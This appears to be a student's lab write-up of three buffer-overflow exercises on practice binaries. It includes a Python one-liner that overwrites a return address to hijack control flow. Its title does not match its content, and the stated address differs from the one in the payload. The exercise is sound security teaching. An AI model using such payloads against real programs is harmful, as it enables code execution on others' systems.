# Task 4.1: Exploring HTTP Messages

**Student ID:** 22110038
**Name:** Phan Triệu Huy 

## Bof1
create file bof1.o:
![image](https://github.com/user-attachments/assets/5a369e7a-5ba9-4813-b01a-41db13fe3b13)
and use disas main for get address's ebp of secretFunc():
![image](https://github.com/user-attachments/assets/c42ca2c6-3a02-46fa-9851-2fb81f316fa0)
=> 0x0804846b
after run code python ( (python -c "print('a'*204+'\x66\x84\x04\x08')") | ./bof1.o 1 )to add address:
![image](https://github.com/user-attachments/assets/fe7f508e-3276-4933-8046-51a3c5590c23)
![image](https://github.com/user-attachments/assets/666bb1c2-9742-4b80-8854-af6c4dadf66c)
## Bof2
create file bof2.o like bof1.o:
![image](https://github.com/user-attachments/assets/be5ffa0d-df7a-49e0-89ee-301d01dfe95a)
and after run code python:
![image](https://github.com/user-attachments/assets/2e0e2e89-0377-4487-9784-e6a2c567c6f3)

## Bof3
Do the same with bof1, bof2:
create file bof3.o and get address's ebp of sup:
![image](https://github.com/user-attachments/assets/8d45503a-a010-463e-a190-02ba22a30dd6)
ebp address of shell:
![image](https://github.com/user-attachments/assets/72fe05e0-92f9-4a15-b922-57388346f5ae)
and the result:
![image](https://github.com/user-attachments/assets/65319b2b-715b-4e0c-af9c-10622cf33494)










